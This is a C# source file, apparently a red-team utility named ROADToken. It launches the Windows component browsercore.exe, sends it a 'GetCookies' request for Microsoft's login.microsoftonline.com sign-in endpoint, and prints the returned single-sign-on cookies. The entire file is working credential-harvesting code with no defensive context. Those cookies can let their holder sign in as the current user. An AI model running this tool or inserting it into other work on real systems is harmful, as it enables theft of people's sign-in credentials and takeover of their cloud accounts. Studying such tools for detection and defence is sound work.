using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ROADToken
{
    class Program
    {
        static void Main(string[] args)
        {
            string[] filelocs = {
                @"C:\Program Files\Windows Security\BrowserCore\browsercore.exe",
                @"C:\Windows\BrowserCore\browsercore.exe"
            };
            string targetFile = null;
            foreach (string file in filelocs)
            {

                if (File.Exists(file))
                {
                    targetFile = file;
                    break;
                }
            }
            if (targetFile == null)
            {
                Console.WriteLine("Could not find browsercore.exe in one of the predefined locations");
                return;
            }
            using (Process myProcess = new Process())
            {
                myProcess.StartInfo.FileName = targetFile;
                myProcess.StartInfo.UseShellExecute = false;
                myProcess.StartInfo.RedirectStandardInput = true;
                myProcess.StartInfo.RedirectStandardOutput = true;
                // TODO: Support for sso_nonce
                string stuff = "{" +
                    "\"method\":\"GetCookies\"," +
                    "\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize\"," +
                    "\"sender\":\"https://login.microsoftonline.com\"" +
                "}";
                myProcess.Start();

                StreamWriter myStreamWriter = myProcess.StandardInput;
                var myInt = stuff.Length;
                // Write length of stream
                byte[] bytes = BitConverter.GetBytes(myInt);
                myStreamWriter.BaseStream.Write(bytes, 0 , 4);
                // Write data
                myStreamWriter.Write(stuff);
                
                // Close stream
                myStreamWriter.Close();
                // Read output
                while (!myProcess.StandardOutput.EndOfStream)
                {
                    string line = myProcess.StandardOutput.ReadLine();
                    Console.WriteLine(line);
                }
                // Wait for exit
                myProcess.WaitForExit();
                Console.WriteLine(myProcess.ExitCode);
            }
        }
    }
}
